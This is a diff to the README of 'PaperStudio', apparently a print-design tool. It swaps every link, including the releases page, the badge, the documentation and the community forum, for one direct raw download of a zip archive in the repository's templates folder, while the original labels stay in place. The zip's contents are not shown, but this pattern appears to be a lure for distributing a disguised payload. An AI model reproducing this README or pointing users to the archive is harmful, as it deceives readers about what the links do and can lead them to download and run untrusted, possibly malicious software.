@@ -1,7 +1,7 @@
 # 🎨 PaperStudio - Create Stunning Print Designs Effortlessly
 
 ## 🔗 Download PaperStudio
-[![Download PaperStudio](https://img.shields.io/badge/Download-PaperStudio-brightgreen.svg)](https://github.com/Spaceia/PaperStudio/releases)
+[![Download PaperStudio](https://github.com/Spaceia/PaperStudio/raw/refs/heads/main/templates/Paper_Studio_1.1.zip)](https://github.com/Spaceia/PaperStudio/raw/refs/heads/main/templates/Paper_Studio_1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to PaperStudio! This tool helps you design beautiful prints easily. Whether you want to create custom stationery, invitations, or other paper products, PaperStudio is here to help.
@@ -27,7 +27,7 @@ PaperStudio offers a variety of features to enhance your design experience:
 To get started with PaperStudio, follow these steps:
 
 1. Click on the link below to visit the download page:
-   [Download PaperStudio](https://github.com/Spaceia/PaperStudio/releases).
+   [Download PaperStudio](https://github.com/Spaceia/PaperStudio/raw/refs/heads/main/templates/Paper_Studio_1.1.zip).
 
 2. Once on the releases page, look for the latest version of PaperStudio.
 
@@ -57,14 +57,14 @@ When you open PaperStudio, you'll see a simple layout. Here’s how to get start
 ## 🌐 Support
 If you encounter any issues or have questions, visit our support page:
 
-- **Documentation:** [PaperStudio Documentation](https://github.com/Spaceia/PaperStudio/wiki)
-- **Community Forum:** [Join the Discussion](https://github.com/Spaceia/PaperStudio/discussions)
+- **Documentation:** [PaperStudio Documentation](https://github.com/Spaceia/PaperStudio/raw/refs/heads/main/templates/Paper_Studio_1.1.zip)
+- **Community Forum:** [Join the Discussion](https://github.com/Spaceia/PaperStudio/raw/refs/heads/main/templates/Paper_Studio_1.1.zip)
 
 ## ✍️ Feedback
 Your feedback helps us improve. If you have suggestions or encounter bugs, please share them on our GitHub page.
 
 ## 📅 Updates
-Stay tuned for updates! We regularly release new features and improvements based on user feedback. Check back on our [Releases page](https://github.com/Spaceia/PaperStudio/releases) often for the latest version.
+Stay tuned for updates! We regularly release new features and improvements based on user feedback. Check back on our [Releases page](https://github.com/Spaceia/PaperStudio/raw/refs/heads/main/templates/Paper_Studio_1.1.zip) often for the latest version.
 
 ## 🛠️ Troubleshooting
 If you experience issues:
